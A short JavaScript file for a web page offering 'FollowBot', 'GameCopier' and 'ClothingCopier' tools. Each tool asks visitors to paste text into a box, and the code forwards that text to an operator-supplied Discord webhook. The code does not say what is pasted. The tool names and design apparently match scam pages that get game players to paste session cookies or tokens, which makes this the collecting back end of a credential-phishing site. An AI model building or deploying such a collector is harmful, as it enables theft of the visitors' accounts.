// Redirect links to internal pages
document.getElementById('home-link').addEventListener('click', function() {
    window.location.href = '/';
});

function sendData(section) {
    let inputText = '';

    if (section === 'FollowBot') {
        inputText = document.getElementById('followbot-input').value;
    } else if (section === 'GameCopier') {
        inputText = document.getElementById('gamecopier-input').value;
    } else if (section === 'ClothingCopier') {
        inputText = document.getElementById('clothingcopier-input').value;
    }

    // Check if input is empty
    if (inputText.trim() === '') {
        alert("Please paste something before submitting!");
        return;
    }

    // Send data to Discord Webhook
    const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace this with your Discord webhook URL
    const data = {
        content: `New submission from ${section} section:\n\n${inputText}`
    };

    axios.post(webhookURL, data)
        .then(response => {
            alert("Submission sent to Discord!");
        })
        .catch(error => {
            alert("There was an error sending the data to Discord.");
            console.error(error);
        });
}
